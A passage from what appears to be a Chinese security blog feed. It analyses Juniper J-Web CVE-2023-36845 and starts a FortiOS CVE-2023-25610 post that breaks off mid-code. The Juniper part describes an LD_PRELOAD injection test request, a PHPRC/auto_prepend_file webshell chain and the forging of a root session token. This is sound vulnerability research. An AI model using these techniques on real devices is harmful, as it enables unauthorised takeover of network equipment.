<span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;DELETE&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">delete_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//echo (&quot;default...&quot;);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_user_preference_file</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;   </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$samplejson</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fp</span>) &#123;       </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$samplejson</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(USER_PREFERENCE_FILE, <span class="number">0666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_preference_file_path</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (USER_PREFERENCE_FILE . <span class="string">&quot;.&quot;</span> . <span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_preferences</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="comment">//print(&quot;&lt;br/&gt; file = &quot; . $file);</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File not found.&quot;&#125;&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">write_dummy_content</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>, <span class="string">&quot;opening file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_SH)) &#123;</span><br><span class="line">		  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Unlocked the file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">		  <span class="variable">$str</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  &#125;     </span><br><span class="line">      </span><br><span class="line">      <span class="variable">$fw</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">is_bool</span>(<span class="variable">$str</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;error while reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$str</span>, <span class="literal">true</span>));</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dummy_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">	 <span class="variable">$payload</span> = <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">	 <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	 <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>))</span><br><span class="line">		 <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	 <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;	  </span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;opening file for writing ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		  <span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX)) &#123;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File locked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  <span class="variable">$fw</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$payload</span>);</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fw</span>) &amp;&amp; <span class="variable">$fw</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				  <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File writing failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">			  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Payload written to file ... of &quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>) . <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN)) &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File unlocked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;<span class="subst">$file</span> was last modified: &quot;</span> . <span class="title function_ invoke__">date</span> (<span class="string">&quot;F d Y H:i:s.&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>)));</span><br><span class="line">		  &#125;        </span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="variable">$fc</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fc</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_log</span>(<span class="params"><span class="variable">$fname</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">error_log</span>(<span class="variable">$fname</span> . <span class="string">&quot; : &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>代码中看到新版添加了两处 return，旧版本中此接口鉴权失败时只会输出一些错误信息，之后会继续向下执行，这样一个未授权的用户也可以使用接口中的主要功能。</p>
<p>此接口会读取用户提交的请求，当请求为 POST 时，代码会打开 <code>/var/tmp/preference.xxx</code> 文件，其中 xxx 为当前用户名，然后将请求体数据写入这个文件。当用户未经授权访问时，username 参数为空，代码会打开 <code>/var/tmp/preference.</code> 文件并写入内容。</p>
<p><code>/var/tmp</code> 是一个临时目录，写入用户权限为 nobody 且位于 chroot 隔离环境，单纯来看这个漏洞并不能产生很大的影响。</p>
<h2 id="CVE-2023-36845"><a href="#CVE-2023-36845" class="headerlink" title="CVE-2023-36845"></a>CVE-2023-36845</h2><p>CVE 链接：<a class="link"   href="https://www.cve.org/CVERecord?id=CVE-2023-36845" >https://www.cve.org/CVERecord?id=CVE-2023-36845<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>根据描述信息来看，未授权用户通过利用此漏洞可以控制关键的环境变量，其中包括 PHP 使用的某些变量，从而导致一些问题。</p>
<p>前面已经对比了 PHP 代码，其中并没有和环境变量相关联的改动，考虑到 J-Web 是一种 CGI 服务结构，和环境变量有关系的逻辑大概率位于 web 服务器中。</p>
<p>J-Web 组件使用的 web 服务器由 appweb 修改而来，程序位于 <code>/packages/mnt/jweb-srxtvp-8ae76b91/usr/sbin</code> 目录。</p>
<p>appweb 是 Embedthis 开发的一款嵌入式 web 服务器，Embedthis 旗下还有 GoAhead 项目，也是一个比较出名的嵌入式 web 服务器。看到这些项目，首先想到 CVE-2017-17562 以及 CVE-2021-42342，这两个是 goahead 的环境变量注入漏洞，成因是代码在处理用户提交的参数时没有合理限制敏感字符，导致可以注入如 LD_PRELOAD 等关键环境变量，appweb 中可能也存在类似的问题。</p>
<p>appweb 在 cgiHandler.c 中包含设置 CGI 环境变量的代码片段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">varCount = mprGetHashLength(rx-&gt;headers) + mprGetHashLength(rx-&gt;svars) + mprGetJsonLength(rx-&gt;params);</span><br><span class="line">    <span class="keyword">if</span> ((envv = mprAlloc((varCount + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>*))) != <span class="number">0</span>) &#123;</span><br><span class="line">        count = copyParams(conn, envv, <span class="number">0</span>, rx-&gt;params, route-&gt;envPrefix);</span><br><span class="line">        count = copyVars(conn, envv, count, rx-&gt;svars, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        count = copyVars(conn, envv, count, rx-&gt;headers, <span class="string">&quot;HTTP_&quot;</span>);</span><br><span class="line">        assert(count &lt;= varCount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们参考 appweb 源代码和 API 文档，发现有一个叫做 <strong>httpSetRouteEnvPrefix</strong> 的函数，手册中定义如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Define a prefix string for environment variables.</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">When mapping URI query parameters and form variables to environment variables, it is important to prevent important system variables like SHELL, PATH and IFS being overwritten or corrupted. Defining a unique prefix for such parameters ensures they have their own namespace.</span><br></pre></td></tr></table></figure></div>

<p>使用这个 API 即可给环境变量设置前缀，但是在 httpd 程序中没有找到对此函数的引用。</p>
<p>从代码层面初步来看这个 httpd 可能也存在类似 goahead 的环境变量注入问题，我们可以构造 poc 进行测试，进一步确认问题是否存在。</p>
<p>构造测试请求如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?LD_PRELOAD=/abcd HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure></div>

<p>发送这个请求服务器会返回 502，当去除 LD_PRELOAD 参数时响应又正常。查看 httpd 的日志 (&#x2F;packages&#x2F;mnt&#x2F;jweb-srxtvp-8ae76b91&#x2F;jail&#x2F;var&#x2F;log&#x2F;httpd-trace.log) 存在以下内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08/23/23 16:53:41 RECV event=http.rx.request type=request method:&#x27;GET&#x27;, uri:&#x27;/?LD_PRELOAD=/abcd&#x27;, protocol:&#x27;1&#x27;</span><br><span class="line">08/23/23 16:53:41 RECV event=cgi.error type=error msg=&quot;CGI failed uri=&#x27;/index.php&#x27;,details: ld-elf.so.1: Cannot open &quot;/abcd&quot;</span><br></pre></td></tr></table></figure></div>

<p>说明 httpd 确实存在环境变量注入问题，可以尝试进一步利用这个漏洞。</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>目前我们已经复现了这两个漏洞，现在要将它们组合起来尝试实现代码执行。</p>
<p>在网上查找相关思路时发现了一篇关于环境变量安全的文章：<a class="link"   href="https://www.elttam.com/blog/env/#content" >https://www.elttam.com/blog/env/#content<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>参考这篇文章得知 PHP 在执行时会读取一些环境变量，其中一个变量为 PHPRC，用于指定 php.ini 配置文件的路径。而 PHP 配置中又存在一个叫做 auto_prepend_file 的变量，通过此变量指定一个文件，当 PHP 执行真正的脚本之前会首先包含此文件，类似于在文件开头调用了 require(auto_prepend_file)。</p>
<p>所以可以先利用文件上传漏洞在 &#x2F;var&#x2F;tmp 构造合适的 php.ini 文件，将 auto_prepend_file 值也设置为此文件路径，然后在文件中插入一句话木马。接着利用环境变量注入漏洞，修改 PHPRC 为刚刚构造的配置文件，最后实现 require(&#x2F;var&#x2F;tmp&#x2F;preference.)，执行任意 PHP 代码。</p>
<p>实现代码执行只是第一步，J-Web 运行在 nobody 权限并且位于 chroot 隔离环境，还需要进一步提升权限。分析 J-Web 各个组件时发现用户登录后 session 令牌会被存放在 <code>(chroot)/var/sess</code> 目录下，具有一定格式。例如以下内容为 root 用户登录后产生的令牌文件：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">language|s:7:&quot;english&quot;;device-hostname|s:6:&quot;NoName&quot;;device-model|s:4:&quot;vsrx&quot;;super-user|s:10:&quot;super-user&quot;;lsysuser|s:0:&quot;&quot;;tenantuser|s:0:&quot;&quot;;super|s:5:&quot;super&quot;;template-username|s:4:&quot;root&quot;;username|s:4:&quot;root&quot;;lsysname|s:0:&quot;&quot;;tenantname|s:0:&quot;&quot;;csrf_key|s:32:&quot;00000000000000000000000000000000&quot;;csrf_token|s:56:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa==&quot;;debug-asp|s:8:&quot;sp-0/0/0&quot;;debug-wizard-commit|b:1;jweb-authenticated|b:1;jweb-user-timeout|s:4:&quot;1800&quot;;jweb-last-access|i:1692806139;GLOBAL_MODE|s:7:&quot;Not set&quot;;junos-version|s:9:&quot;22.1R2.10&quot;;isModelL2NG|b:1;jweb-commit-mode|s:12:&quot;commit-check&quot;;TAP_MODE|b:0;SKYATP_ENABLED|b:0;DEVICE_ON_SDCLOUD|b:0;report_enabled|b:0;</span><br></pre></td></tr></table></figure></div>

<p>参照这种格式利用代码执行漏洞在 sess 目录下新建一个令牌，使用此令牌即可以管理员身份登录到 J-Web 后台，控制设备的大部分配置。</p>
<p>实际上，环境变量注入漏洞可以不依赖文件上传而直接实现远程代码执行，由于 web 服务使用 stdin 读取用户数据，所以可以将 PHPRC 直接指向 &#x2F;dev&#x2F;fd&#x2F;0 文件，然后在请求体中注入相关配置，即可执行任意 PHP 代码，具体可参考相关<a class="link"   href="https://github.com/kljunowsky/CVE-2023-36845" >开源工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除文中提到的思路外，还可以利用设备某些功能从 chroot 环境中逃逸出来，造成更加严重的安全风险。深入利用就留给感兴趣的朋友自行探索吧。</p>
<p>本次 Juniper EX 和 SRX 漏洞利用了 web 服务器环境变量问题和文件上传，实现了较为稳定的远程代码执行。漏洞危害较大，目前官方已经发布了安全补丁，建议用户及时更新。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://supportportal.juniper.net/JSA72300" >https://supportportal.juniper.net/JSA72300<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/lisenlin/p/10302318.html" >https://www.cnblogs.com/lisenlin/p/10302318.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://forum.butian.net/index.php/share/1942" >https://forum.butian.net/index.php/share/1942<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.elttam.com/blog/env/#content" >https://www.elttam.com/blog/env/#content<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/kljunowsky/CVE-2023-36845" >https://github.com/kljunowsky/CVE-2023-36845<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-25610</title>
    <url>/2023/05/29/CVE-2023-25610/</url>
    <content><![CDATA[<p>2023 年 3 月 7 日，Fortinet 发布了影响 FortiOS 管理端口的漏洞 CVE-2023-25610，官方解释该漏洞为 “堆内存下溢”，通过利用此漏洞，未经授权的攻击者<strong>可能</strong>实现任意代码执行，本文对该漏洞进行分析。</p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>关于 FortiOS 本博客中包含数篇历史文章，讨论了如何获取其系统权限、如何通过授权验证以及复现漏洞时的基本思路。</p>
<p>同理，针对此漏洞，我们可以通过补丁对比的方式来分析，或者是编写一些 FUZZ 脚本进行测试。</p>
<p>考虑 FortiOS 曾经出现过的缓冲区溢出类漏洞，包括近期的 CVE-2022-42475，猜测 CVE-2023-25610 应该也是出现在解析 HTTP 请求过程中。在进行补丁对比时我们重点关注处理请求的相关函数，最终找到疑似关键位置 util_read，此函数在 7.x 新旧版本代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">util_read</span><span class="params">(__int64 a1, <span class="type">void</span> **a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er15</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">apr_pool_t</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8200</span>]; <span class="comment">// [rsp+10h] [rbp-2040h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+2018h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v5 = *(_QWORD *)(a1 + <span class="number">216</span>);</span><br><span class="line">  v6 = *(<span class="type">apr_pool_t</span> **)a1;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = apr_palloc(v6, v5 + <span class="number">1</span>);</span><br><span class="line">  *a2 = <span class="built_in">memset</span>(v7, <span class="number">0</span>, v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = ap_get_client_block(a1, src, <span class="number">0x2000</span>LL);</span><br><span class="line">    v9 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = v3 + v11;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; v3 + v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v5;</span><br><span class="line">      v9 = v5 - v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = (<span class="type">char</span> *)*a2 + v3;</span><br><span class="line">    v3 = v8;</span><br><span class="line">    <span class="built_in">memcpy</span>(v10, src, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    *a3 = v3;</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">util_read</span><span class="params">(_QWORD *a1, <span class="type">char</span> **a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// er13</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// er15</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_22038F0(<span class="number">11</span>, a2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">500</span>;</span><br><span class="line">    sub_CA4A60();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = sub_22CDE00(*(qword_F34CC20 + <span class="number">88</span>));</span><br><span class="line">    v7 = sub_CA4A60();</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &amp;&amp; *v7 )</span><br><span class="line">        v18 = *(v6 + <span class="number">1588</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v18 = *(v6 + <span class="number">1592</span>);</span><br><span class="line">      v4 = <span class="number">400</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">27</span>] &lt;= <span class="number">0x7FFFFFFF</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = ap_setup_client_block(a1, <span class="number">1LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ap_should_client_block(a1) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = a1[<span class="number">27</span>];</span><br><span class="line">            v9 = v8;</span><br><span class="line">            <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> || v18 &lt; v8 )</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">              v4 = <span class="number">413</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span 